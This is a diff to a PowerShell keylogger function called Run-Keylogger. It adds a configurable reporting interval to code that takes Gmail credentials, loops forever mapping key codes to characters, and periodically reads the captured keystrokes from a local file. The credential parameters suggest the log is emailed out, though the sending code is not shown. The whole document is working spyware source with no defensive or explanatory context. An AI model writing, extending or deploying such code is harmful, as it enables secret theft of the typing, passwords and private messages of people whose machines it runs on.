@@ -1,6 +1,6 @@
 function Run-Keylogger {
 
-param($gmail,$password)
+param($gmail,$password,$period)
 
 $numValues = 96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,32
 $numKeys = '0','1','2','3','4','5','6','7','8','9','*','+','|','-','.','/'," "
@@ -34,7 +34,7 @@ $stopwatch = [system.diagnostics.stopwatch]::StartNew();
 $caps = 0
 
 while($true){
-  if($stopwatch.ElapsedMilliseconds -ge 60000){
+  if($stopwatch.ElapsedMilliseconds -ge ($period*60000)){
     $stopwatch.Stop()
     $stopwatch = [system.diagnostics.stopwatch]::StartNew();
     $content = Get-Content 'C:\users\hilld\file.txt'
